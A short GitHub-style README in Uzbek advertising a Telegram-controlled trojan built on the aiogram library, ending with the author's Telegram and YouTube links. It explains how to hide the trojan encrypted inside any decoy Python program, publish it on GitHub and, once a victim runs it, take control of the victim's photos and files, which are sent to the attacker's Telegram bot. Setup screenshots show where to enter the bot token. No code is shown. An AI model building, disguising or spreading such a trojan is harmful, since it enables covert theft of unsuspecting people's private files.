## Telegram trojan bot

## **Githubga joylanuvchi trojan dastur**
Ushbu dastur aiogram librarysiga asoslanadi va bu dasturni maskirovka qilish uchun main.py file dasturlanishi kerak (harqanday) va trojan-bot.py ga biriktirilib shifrlangan holatda githubga joylanadi, bunda jabrlanuvchi dasutringizni ishga tushurganida uning rasmlariga hamda fayllar boshqaruvini qo'lga kiritasiz
## **O'rnatish**
![image](https://github.com/user-attachments/assets/cd8f3e49-fea8-4a48-8c7a-4027b7fe8599)
Bu yerga bot tokeni yoziladi 
![image](https://github.com/user-attachments/assets/183ebd18-cfd7-4945-87f1-c0090dd35f33)
Bu yerga esa harqanday .py dasturingizni joylashtirasiz, malumotlar jabrlanuvchining computeridan telegram botingizga yuborilinadi
## **Dasturchi**

Telegram Kanal: **[Satomoru](https://t.me/satomoru_official)**

Muloqot uchun: **[Hevorix](https://t.me/hevorix)**

Youtube Kanal: **[X.SATOMORU](https://youtube.com/@DARKNET_OFF1CIAL)**
